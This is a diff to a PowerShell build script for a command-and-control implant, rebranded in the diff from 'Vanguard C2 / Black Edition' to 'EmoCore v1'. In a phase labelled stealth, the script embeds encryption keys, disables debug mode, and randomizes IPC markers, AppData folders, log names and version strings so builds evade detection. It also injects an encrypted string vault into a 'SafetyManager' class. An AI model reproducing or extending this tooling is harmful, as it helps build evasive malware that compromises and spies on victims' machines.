@@ -2,7 +2,7 @@
 $ErrorActionPreference = "Stop"
 
 Write-Host "================================================" -ForegroundColor Cyan
-Write-Host "   VANGUARD C2: ULTRA-OPTIMIZED BUILD (GZIP)    " -ForegroundColor Cyan
+Write-Host "          EMOCORE v1: CONSOLIDATED BUILD        " -ForegroundColor Cyan
 Write-Host "================================================" -ForegroundColor Cyan
 
 # Configuration
@@ -31,14 +31,14 @@ $content = Get-Content $constantsPath -Raw
 $content = $content -replace 'public const string MASTER_KEY_B64 = ".*?";', "public const string MASTER_KEY_B64 = `"$MasterKeyB64`";"
 $content = $content -replace 'public const string ENCRYPTED_SESSION_KEY_B64 = ".*?";', "public const string ENCRYPTED_SESSION_KEY_B64 = `"$EncryptedSessionKeyB64`";"
 
-# --- Phase 0.1: Black Edition Finalization (Stealth & IPC) ---
+# --- Phase 0.1: EmoCore v1 Finalization (Stealth & IPC) ---
 Write-Host "[*] Phase 0.1: Randomizing IPC and Stealth Toggles..." -ForegroundColor Cyan
 
 # 1. Disable Debug Mode for Production
 $content = $content -replace 'DEBUG_MODE = true', 'DEBUG_MODE = false'
 
 # 2. Randomize IPC markers
-$RandIPC = "Vanguard_Event_$( [Guid]::NewGuid().ToString("N").Substring(0, 8) )"
+$RandIPC = "EmoCore_Event_$( [Guid]::NewGuid().ToString("N").Substring(0, 8) )"
 $content = $content -replace 'IPC_EVENT_BASE = ".*?"', "IPC_EVENT_BASE = `"$RandIPC`""
 
 # 3. Randomize AppData subdirectory (Core)
@@ -59,7 +59,7 @@ $RandLog = "err_$((Get-Random -Minimum 1000 -Maximum 9999)).log"
 $content = $content -replace 'LOG_FILE_NAME = ".*?"', "LOG_FILE_NAME = `"$RandLog`""
 
 # 5. Randomize Version
-$RandVer = "$((Get-Date).ToString("yyMM")).$((Get-Random -Minimum 1 -Maximum 9)).$((Get-Random -Minimum 0 -Maximum 99))-BE"
+$RandVer = "$((Get-Date).ToString("yyMM")).$((Get-Random -Minimum 1 -Maximum 9)).$((Get-Random -Minimum 0 -Maximum 99))-v1"
 $content = $content -replace 'VERSION = ".*?"', "VERSION = `"$RandVer`""
 
 Set-Content $constantsPath $content
@@ -122,15 +122,27 @@ foreach ($line in $PackerOutput) {
 }
 
 $VaultCode = [string]::Join(",`n", $VaultEntries)
+# --- Phase 0.8: Pre-flight Safety Sanitization ---
 $SafetyPath = "defense\SafetyManager.cs"
 $SafetyContent = Get-Content $SafetyPath -Raw
+
+Write-Host "[*] Sanitizing SafetyManager (Stripping HWID layer & restoring placeholders)..." -ForegroundColor Yellow
+# 1. Force-strip HWID XOR layer from Resolve method
+$SafetyContent = $SafetyContent -replace '// Derive Hardware-Bound Key Layer[\s\S]*?for \(int i = 0; i < 32; i\+\+\) hKey\[i\] \^= hwid\[i % hwid\.Length\];', "// Direct Key usage (Build-time synchronized)`n                if (VAULT_KEY == null) return `"KEY_ERR`";`n                byte[] hKey = VAULT_KEY;"
+
+# 2. Restore placeholders if they were previously patched (idempotency)
+$SafetyContent = $SafetyContent -replace 'private static byte\[\] VAULT_KEY = Convert\.FromBase64String\(.*?\);', "private static byte[]? VAULT_KEY;"
+$SafetyContent = $SafetyContent -replace 'private static byte\[\] VAULT_IV = Convert\.FromBase64String\(.*?\);', "private static byte[]? VAULT_IV;"
+
+# --- Phase 0.9: Vault Injection (Vault 2.0) ---
+Write-Host "[*] Injecting build-time synchronized secrets..." -ForegroundColor Yellow
 
 # Patch the VaultKey and VaultIV
 $SafetyContent = $SafetyContent -replace 'private static byte\[\]\? VAULT_KEY;', "private static byte[] VAULT_KEY = Convert.FromBase64String(`"$VaultKeyB64`");"
 $SafetyContent = $SafetyContent -replace 'private static byte\[\]\? VAULT_IV;', "private static byte[] VAULT_IV = Convert.FromBase64String(`"$VaultIVB64`");"
 
 # Patch the Dictionary
-$Pattern = 'private static readonly Dictionary<string, byte\[\]> _vault = new Dictionary<string, byte\[\]>\s*\{[\s\S]*?\};'
+$Pattern = 'private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>\s*\{[\s\S]*?\};'
 $NewDict = "private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>`n        {`n$VaultCode`n        };"
 $SafetyContent = [System.Text.RegularExpressions.Regex]::Replace($SafetyContent, $Pattern, $NewDict)
 
